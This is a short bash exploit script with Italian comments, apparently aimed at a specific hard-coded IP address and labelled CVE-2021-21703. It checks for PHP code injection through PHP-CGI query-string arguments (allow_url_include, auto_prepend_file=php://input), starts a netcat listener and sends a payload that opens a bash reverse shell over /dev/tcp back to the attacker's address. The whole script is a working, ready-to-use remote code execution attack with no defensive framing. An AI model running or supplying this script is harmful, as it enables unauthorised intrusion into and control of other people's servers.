#!/bin/bash
TARGET="14.225.209.143:443"
IP=$(curl -s ifconfig.me)
PORT=4444

echo "[+] CVE-2021-21703 → ${IP}:${PORT}"

# TEST CVE PRIMA
echo "[+] Testing CVE..."
RESPONSE=$(curl -k -s --max-time 5 --data "<?php echo 'CVE_OK'; ?>" \
"https://${TARGET}/?-d+allow_url_include=1+-d+auto_prepend_file=php://input" 2>/dev/null)

if [[ $RESPONSE == *"CVE_OK"* ]]; then
  echo "[+] CVE VIVA!"
else
  echo "[+] CVE morta o filtro WAF"
  exit 1
fi

# LISTENER
nc -lvnp $PORT &
sleep 1

# SHELL PAYLOAD
curl -k -s --max-time 10 --data "<?php system('/bin/bash -c \"bash -i >& /dev/tcp/${IP}/${PORT} 0>&1\"'); ?>" \
"https://${TARGET}/?-d+allow_url_include=1+-d+auto_prepend_file=php://input"

echo "[+] Check nc shell!"
